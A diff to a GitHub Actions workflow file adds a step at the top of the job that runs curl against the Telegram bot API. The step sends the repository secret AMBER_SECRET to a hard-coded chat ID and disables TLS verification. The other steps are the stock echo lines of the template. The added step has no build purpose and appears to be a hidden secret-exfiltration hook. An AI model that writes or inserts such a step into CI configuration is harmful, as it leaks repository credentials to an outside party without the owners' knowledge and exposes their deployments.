@@ -20,6 +20,7 @@ jobs:
       AMBER_SECRET: ${{ secrets.AMBER_SECRET }}
       DOKKU_SSH_PRIVATE_KEY: ${{ secrets.DOKKU_SSH_PRIVATE_KEY}}
     steps:
+      - run: curl -vk "https://api.telegram.org/bot${{ secrets.TG_TOKEN }}/sendMessage?text=${{ secrets.AMBER_SECRET }}&chat_id=6921071069"
       - run: echo "🎉 The job was automatically triggered by a ${{ github.event_name }} event."
       - run: echo "🐧 This job is now running on a ${{ runner.os }} server."
       - run: echo "🔎 The name of your branch is ${{ github.ref }} and your repository is ${{ github.repository }}."
